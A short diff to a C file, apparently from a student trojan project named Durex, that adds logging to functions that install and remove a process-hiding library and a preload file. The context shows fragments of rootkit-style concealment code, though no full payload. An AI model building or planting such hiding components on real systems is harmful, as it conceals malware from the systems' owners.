@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/08/14 01:44:46 by root              #+#    #+#             */
-/*   Updated: 2018/08/21 04:18:51 by root             ###   ########.fr       */
+/*   Updated: 2018/08/23 03:40:44 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -45,6 +45,7 @@ int				install_library()
 		fd = open(files[i], O_CREAT | O_TRUNC | O_WRONLY, 0644);
 		if (fd < 0)
 			return 0;
+		serverLog("[INFO] - Installing %s...", files[i]);
 		ret = write(fd, src[i], mystrlen(src[i]));
 		close(fd);
 		if (ret != (size_t)mystrlen(src[i]))
@@ -118,6 +119,7 @@ void			check_library()
 
 void			uninstall_library()
 {
+	serverLog("[INFO] - Removing library");
 	remove(DUREX_PROCESSHIDER_LIB);
 	remove(DUREX_PRELOAD);
 }
